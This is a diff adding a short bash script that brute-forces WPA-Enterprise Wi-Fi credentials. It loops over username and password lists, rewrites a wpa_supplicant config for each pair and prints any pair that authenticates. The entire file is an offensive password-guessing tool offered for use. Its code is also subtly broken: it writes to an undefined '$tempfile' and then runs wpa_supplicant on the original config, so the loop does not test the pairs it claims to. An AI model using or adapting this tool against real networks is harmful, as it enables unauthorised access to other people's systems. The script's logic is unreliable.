@@ -1,0 +1,56 @@
+#! /bin/bash 
+# Nelson Murilo - 2024/06/16 AMS (c) 
+#
+usage ()
+{
+  echo -e " Usage: bfr -i iface -u user_list -p password_list -s SSID -[t wait_time] [-d]" 
+  echo "	Default: t=8, debug off" 
+  exit 1
+}
+
+debug=""
+t=8
+tmpfile="./wpa.conf" 
+iw=$(which iw)
+ip=$(which ip)
+wpa_sup=$(which wpa_supplicant)
+while getopts 'i:u:p:s:t:d' c; do 
+   case $c in
+      p) pfile=${OPTARG} ;; 
+      u) ufile=${OPTARG} ;;
+      i) iface=${OPTARG} ;; 
+      s) ssid=${OPTARG} ;; 
+      t) t=${OPTARG} ;; 
+      d) debug="1" ;;
+      *) usage ;; 
+    esac
+done
+
+[ -z ${wpa_sup} ] && { 
+   echo wpa_supplicant not found, please install 
+   exit
+}
+[ -z "${pfile}" -o -z "${ufile}" -o -z "${iface}" ] && usage 
+[ ! -r "${pfile}" -o ! -r "${ufile}" ] && usage 
+if ! ${iw} "${iface}" info >/dev/null ; then 
+   echo "Interface $iface not found" 
+   exit
+fi
+ip link set ${iface} up 
+if ! ${iw} dev "$iface" scan | grep $ssid > /dev/null; then 
+   echo "SSID $ssid not found"  
+   exit 
+fi
+
+for user in $(cat $ufile); do 
+   for pwd in $(cat $pfile) ;do 
+      cat wpa.conf | \
+      sed -e "s/ssid=\".*\"/ssid=\"$ssid\"/" | \
+      sed -e "s/identity=\".*\"/identity=\"$user\"/" | \
+      sed -e "s/password=\".*\"/password=\"$pwd\"/" > $tempfile
+      [ ! -z "$debug" ] && echo "Trying $user:$pwd" 
+      if timeout $t ${wpa_sup} -c ./wpa.conf -i $iface 2>/dev/null | grep complete >/dev/null ; then 
+         echo "Creadential found: $user:$pwd" 
+      fi
+   done
+done
